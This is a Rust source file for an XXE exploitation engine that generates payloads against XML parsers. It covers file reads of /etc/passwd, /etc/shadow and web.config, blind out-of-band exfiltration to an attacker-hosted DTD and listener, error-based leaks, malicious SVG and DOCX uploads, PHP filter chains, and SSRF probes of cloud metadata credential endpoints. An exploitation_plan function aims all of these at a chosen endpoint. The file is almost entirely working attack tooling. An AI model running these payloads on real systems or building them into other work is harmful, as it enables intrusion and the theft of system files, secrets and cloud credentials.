use std::fmt;

/// All XXE exploitation techniques this engine supports.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum XxeVariant {
    BasicFileRead,
    BlindOob,
    ErrorBased,
    FileUploadSvg,
    FileUploadDocx,
    SoapEnvelope,
    JsonToXmlConversion,
    PhpFilterChain,
    XxeToSsrf,
}

impl XxeVariant {
    pub fn all() -> &'static [XxeVariant] {
        &[
            Self::BasicFileRead,
            Self::BlindOob,
            Self::ErrorBased,
            Self::FileUploadSvg,
            Self::FileUploadDocx,
            Self::SoapEnvelope,
            Self::JsonToXmlConversion,
            Self::PhpFilterChain,
            Self::XxeToSsrf,
        ]
    }

    pub fn severity(self) -> f64 {
        match self {
            Self::BasicFileRead => 7.5,
            Self::BlindOob => 8.0,
            Self::ErrorBased => 7.0,
            Self::FileUploadSvg => 7.5,
            Self::FileUploadDocx => 7.5,
            Self::SoapEnvelope => 8.0,
            Self::JsonToXmlConversion => 7.0,
            Self::PhpFilterChain => 9.0,
            Self::XxeToSsrf => 9.0,
        }
    }
}

impl fmt::Display for XxeVariant {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::BasicFileRead => "basic-file-read",
            Self::BlindOob => "blind-oob",
            Self::ErrorBased => "error-based",
            Self::FileUploadSvg => "file-upload-svg",
            Self::FileUploadDocx => "file-upload-docx",
            Self::SoapEnvelope => "soap-envelope",
            Self::JsonToXmlConversion => "json-to-xml",
            Self::PhpFilterChain => "php-filter-chain",
            Self::XxeToSsrf => "xxe-to-ssrf",
        };
        write!(f, "{label}")
    }
}

/// Target operating system — controls which file paths appear in payloads.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum TargetOs {
    Linux,
    Windows,
}

/// A generated XXE payload with metadata.
#[derive(Debug, Clone)]
pub struct XxePayload {
    pub variant: XxeVariant,
    pub body: String,
    pub content_type: String,
    pub description: String,
    pub target_os: TargetOs,
}

/// Result of blind OOB generation — includes the external DTD the attacker must host.
#[derive(Debug, Clone)]
pub struct BlindOobBundle {
    pub payload: XxePayload,
    pub external_dtd: String,
    pub listener_url: String,
}

/// DOCX payload bundle — the raw ZIP bytes plus the injection XML.
#[derive(Debug, Clone)]
pub struct DocxPayload {
    pub zip_bytes: Vec<u8>,
    pub injected_xml: String,
    pub description: String,
}

pub struct XxeEngine {
    attacker_host: String,
}

impl XxeEngine {
    pub fn new(attacker_host: &str) -> Self {
        Self {
            attacker_host: attacker_host.to_string(),
        }
    }

    /// Generate payloads for every variant, both OS targets.
    pub fn generate_all(&self) -> Vec<XxePayload> {
        let mut payloads = Vec::new();
        for &os in &[TargetOs::Linux, TargetOs::Windows] {
            payloads.extend(self.basic_file_read(os));
            payloads.push(self.blind_oob(os).payload);
            payloads.extend(self.error_based(os));
            payloads.push(self.file_upload_svg(os));
            payloads.push(self.soap_envelope(os));
            payloads.push(self.json_to_xml(os));
            payloads.extend(self.php_filter_chain(os));
            payloads.extend(self.xxe_to_ssrf(os));
        }
        payloads
    }

    /// Basic SYSTEM entity file read.
    pub fn basic_file_read(&self, os: TargetOs) -> Vec<XxePayload> {
        let targets = file_targets(os);
        targets
            .iter()
            .map(|path| {
                let body = format!(
                    r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{path}">
]>
<root><data>&xxe;</data></root>"#
                );
                XxePayload {
                    variant: XxeVariant::BasicFileRead,
                    body,
                    content_type: "application/xml".to_string(),
                    description: format!("Basic file read via SYSTEM entity: {path}"),
                    target_os: os,
                }
            })
            .collect()
    }

    /// Blind OOB exfiltration — external DTD fetched from attacker server.
    pub fn blind_oob(&self, os: TargetOs) -> BlindOobBundle {
        let target_file = primary_target(os);
        let listener_url = format!("{}/xxe-exfil", self.attacker_host);
        let dtd_url = format!("{}/evil.dtd", self.attacker_host);

        let external_dtd = format!(
            r#"<!ENTITY % file SYSTEM "file://{target_file}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{listener_url}/?data=%file;'>">
%eval;
%exfil;"#
        );

        let body = format!(
            r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "{dtd_url}">
  %dtd;
]>
<root><data>blind</data></root>"#
        );

        let payload = XxePayload {
            variant: XxeVariant::BlindOob,
            body,
            content_type: "application/xml".to_string(),
            description: format!("Blind OOB XXE via external DTD at {dtd_url}"),
            target_os: os,
        };

        BlindOobBundle {
            payload,
            external_dtd,
            listener_url,
        }
    }

    /// Error-based XXE — triggers parse errors that leak file contents in error messages.
    pub fn error_based(&self, os: TargetOs) -> Vec<XxePayload> {
        let target_file = primary_target(os);

        let nonexistent_payload = format!(
            r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file://{target_file}">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root><data>error</data></root>"#
        );

        let recursive_payload = format!(
            r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file://{target_file}">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '://%file;'>">
  %eval;
  %exfil;
]>
<root><data>error-recursive</data></root>"#
        );

        vec![
            XxePayload {
                variant: XxeVariant::ErrorBased,
                body: nonexistent_payload,
                content_type: "application/xml".to_string(),
                description: "Error-based XXE via nonexistent file path embedding".to_string(),
                target_os: os,
            },
            XxePayload {
                variant: XxeVariant::ErrorBased,
                body: recursive_payload,
                content_type: "application/xml".to_string(),
                description: "Error-based XXE via malformed URI scheme".to_string(),
                target_os: os,
            },
        ]
    }

    /// SVG file upload with embedded XXE entity.
    pub fn file_upload_svg(&self, os: TargetOs) -> XxePayload {
        let target_file = primary_target(os);
        let body = format!(
            r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file://{target_file}">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="128" height="128">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>"#
        );

        XxePayload {
            variant: XxeVariant::FileUploadSvg,
            body,
            content_type: "image/svg+xml".to_string(),
            description: format!("SVG upload XXE reading {target_file}"),
            target_os: os,
        }
    }

    /// DOCX file upload — returns raw ZIP bytes containing malicious XML in word/document.xml.
    pub fn file_upload_docx(&self, os: TargetOs) -> DocxPayload {
        let target_file = primary_target(os);
        let document_xml = format!(
            r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE doc [
  <!ENTITY xxe SYSTEM "file://{target_file}">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
  </w:body>
</w:document>"#
        );

        let content_types_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="xml" ContentType="application/xml"/>
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/word/document.xml"
    ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>"#;

        let rels_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"
    Target="word/document.xml"/>
</Relationships>"#;

        let zip_bytes = build_docx_zip(content_types_xml, rels_xml, &document_xml);

        DocxPayload {
            zip_bytes,
            injected_xml: document_xml,
            description: format!("DOCX upload XXE reading {target_file}"),
        }
    }

    /// SOAP envelope with external DTD entity injection.
    pub fn soap_envelope(&self, os: TargetOs) -> XxePayload {
        let target_file = primary_target(os);
        let body = format!(
            r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{target_file}">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header/>
  <soap:Body>
    <GetData>
      <Input>&xxe;</Input>
    </GetData>
  </soap:Body>
</soap:Envelope>"#
        );

        XxePayload {
            variant: XxeVariant::SoapEnvelope,
            body,
            content_type: "text/xml; charset=utf-8".to_string(),
            description: format!("SOAP envelope XXE reading {target_file}"),
            target_os: os,
        }
    }

    /// JSON→XML conversion exploit — same entity payload but with JSON-derived structure.
    pub fn json_to_xml(&self, os: TargetOs) -> XxePayload {
        let target_file = primary_target(os);
        let body = format!(
            r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{target_file}">
]>
<root>
  <username>&xxe;</username>
  <password>anything</password>
</root>"#
        );

        XxePayload {
            variant: XxeVariant::JsonToXmlConversion,
            body,
            content_type: "application/xml".to_string(),
            description: "JSON-to-XML conversion XXE — send XML to JSON endpoint".to_string(),
            target_os: os,
        }
    }

    /// PHP filter wrapper chains for base64-encoded binary file exfiltration.
    pub fn php_filter_chain(&self, os: TargetOs) -> Vec<XxePayload> {
        let filters = match os {
            TargetOs::Linux => vec![
                (
                    "php://filter/convert.base64-encode/resource=/etc/passwd",
                    "base64 /etc/passwd",
                ),
                (
                    "php://filter/convert.base64-encode/resource=/etc/shadow",
                    "base64 /etc/shadow",
                ),
                (
                    "php://filter/read=convert.base64-encode/resource=/var/www/html/config.php",
                    "base64 config.php",
                ),
            ],
            TargetOs::Windows => vec![
                (
                    "php://filter/convert.base64-encode/resource=C:\\Windows\\win.ini",
                    "base64 win.ini",
                ),
                (
                    "php://filter/convert.base64-encode/resource=C:\\inetpub\\wwwroot\\web.config",
                    "base64 web.config",
                ),
            ],
        };

        filters
            .into_iter()
            .map(|(filter_uri, desc)| {
                let body = format!(
                    r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{filter_uri}">
]>
<root><data>&xxe;</data></root>"#
                );
                XxePayload {
                    variant: XxeVariant::PhpFilterChain,
                    body,
                    content_type: "application/xml".to_string(),
                    description: format!("PHP filter chain XXE: {desc}"),
                    target_os: os,
                }
            })
            .collect()
    }

    /// XXE to SSRF — use XML entity to probe internal services.
    pub fn xxe_to_ssrf(&self, os: TargetOs) -> Vec<XxePayload> {
        let internal_targets = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://localhost:8080/",
            "http://127.0.0.1:6379/",
            "http://[::1]:8443/",
            "http://metadata.google.internal/computeMetadata/v1/",
        ];

        internal_targets
            .iter()
            .map(|url| {
                let body = format!(
                    r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{url}">
]>
<root><data>&xxe;</data></root>"#
                );
                XxePayload {
                    variant: XxeVariant::XxeToSsrf,
                    body,
                    content_type: "application/xml".to_string(),
                    description: format!("XXE-to-SSRF probing {url}"),
                    target_os: os,
                }
            })
            .collect()
    }

    /// Generate a complete exploitation plan for a given endpoint.
    pub fn exploitation_plan(&self, endpoint: &str) -> Vec<XxePayload> {
        let mut plan = Vec::new();
        for &os in &[TargetOs::Linux, TargetOs::Windows] {
            plan.extend(self.basic_file_read(os));
            plan.push(self.blind_oob(os).payload);
            plan.extend(self.error_based(os));
            plan.push(self.file_upload_svg(os));
            plan.push(self.soap_envelope(os));
            plan.push(self.json_to_xml(os));
            plan.extend(self.php_filter_chain(os));
            plan.extend(self.xxe_to_ssrf(os));
        }
        for p in &mut plan {
            p.description = format!("[{}] {}", endpoint, p.description);
        }
        plan
    }
}

fn file_targets(os: TargetOs) -> Vec<&'static str> {
    match os {
        TargetOs::Linux => vec![
            "/etc/passwd",
            "/etc/hostname",
            "/proc/self/environ",
            "/etc/shadow",
        ],
        TargetOs::Windows => vec![
            "C:\\Windows\\win.ini",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "C:\\inetpub\\wwwroot\\web.config",
        ],
    }
}

fn primary_target(os: TargetOs) -> &'static str {
    match os {
        TargetOs::Linux => "/etc/passwd",
        TargetOs::Windows => "C:\\Windows\\win.ini",
    }
}

/// Build a minimal DOCX (OOXML) ZIP archive in memory.
fn build_docx_zip(content_types: &str, rels: &str, document: &str) -> Vec<u8> {
    let mut buf = Vec::new();
    let entries: Vec<(&str, &[u8])> = vec![
        ("[Content_Types].xml", content_types.as_bytes()),
        ("_rels/.rels", rels.as_bytes()),
        ("word/document.xml", document.as_bytes()),
    ];

    for (name, data) in &entries {
        let name_bytes = name.as_bytes();
        // Local file header
        buf.extend_from_slice(&[0x50, 0x4b, 0x03, 0x04]); // signature
        buf.extend_from_slice(&(20u16).to_le_bytes()); // version needed
        buf.extend_from_slice(&(0u16).to_le_bytes()); // flags
        buf.extend_from_slice(&(0u16).to_le_bytes()); // compression: stored
        buf.extend_from_slice(&(0u16).to_le_bytes()); // mod time
        buf.extend_from_slice(&(0u16).to_le_bytes()); // mod date
        buf.extend_from_slice(&crc32(data).to_le_bytes()); // crc32
        buf.extend_from_slice(&(data.len() as u32).to_le_bytes()); // compressed size
        buf.extend_from_slice(&(data.len() as u32).to_le_bytes()); // uncompressed size
        buf.extend_from_slice(&(name_bytes.len() as u16).to_le_bytes()); // name length
        buf.extend_from_slice(&(0u16).to_le_bytes()); // extra length
        buf.extend_from_slice(name_bytes);
        buf.extend_from_slice(data);
    }

    let central_dir_offset = buf.len() as u32;
    let mut local_offset: u32 = 0;

    for (name, data) in &entries {
        let name_bytes = name.as_bytes();
        // Central directory header
        buf.extend_from_slice(&[0x50, 0x4b, 0x01, 0x02]); // signature
        buf.extend_from_slice(&(20u16).to_le_bytes()); // version made by
        buf.extend_from_slice(&(20u16).to_le_bytes()); // version needed
        buf.extend_from_slice(&(0u16).to_le_bytes()); // flags
        buf.extend_from_slice(&(0u16).to_le_bytes()); // compression
        buf.extend_from_slice(&(0u16).to_le_bytes()); // mod time
        buf.extend_from_slice(&(0u16).to_le_bytes()); // mod date
        buf.extend_from_slice(&crc32(data).to_le_bytes()); // crc32
        buf.extend_from_slice(&(data.len() as u32).to_le_bytes()); // compressed
        buf.extend_from_slice(&(data.len() as u32).to_le_bytes()); // uncompressed
        buf.extend_from_slice(&(name_bytes.len() as u16).to_le_bytes()); // name len
        buf.extend_from_slice(&(0u16).to_le_bytes()); // extra len
        buf.extend_from_slice(&(0u16).to_le_bytes()); // comment len
        buf.extend_from_slice(&(0u16).to_le_bytes()); // disk number start
        buf.extend_from_slice(&(0u16).to_le_bytes()); // internal attrs
        buf.extend_from_slice(&(0u32).to_le_bytes()); // external attrs
        buf.extend_from_slice(&local_offset.to_le_bytes()); // relative offset
        buf.extend_from_slice(name_bytes);

        // 30 = local header fixed size
        local_offset += 30 + name_bytes.len() as u32 + data.len() as u32;
    }

    let central_dir_size = buf.len() as u32 - central_dir_offset;
    let entry_count = entries.len() as u16;

    // End of central directory
    buf.extend_from_slice(&[0x50, 0x4b, 0x05, 0x06]); // signature
    buf.extend_from_slice(&(0u16).to_le_bytes()); // disk number
    buf.extend_from_slice(&(0u16).to_le_bytes()); // disk with central dir
    buf.extend_from_slice(&entry_count.to_le_bytes()); // entries on this disk
    buf.extend_from_slice(&entry_count.to_le_bytes()); // total entries
    buf.extend_from_slice(&central_dir_size.to_le_bytes()); // central dir size
    buf.extend_from_slice(&central_dir_offset.to_le_bytes()); // central dir offset
    buf.extend_from_slice(&(0u16).to_le_bytes()); // comment length

    buf
}

/// Minimal CRC-32 (IEEE) — no external dependency needed for test/payload generation.
fn crc32(data: &[u8]) -> u32 {
    let mut crc: u32 = 0xFFFF_FFFF;
    for &byte in data {
        crc ^= byte as u32;
        for _ in 0..8 {
            if crc & 1 != 0 {
                crc = (crc >> 1) ^ 0xEDB8_8320;
            } else {
                crc >>= 1;
            }
        }
    }
    !crc
}
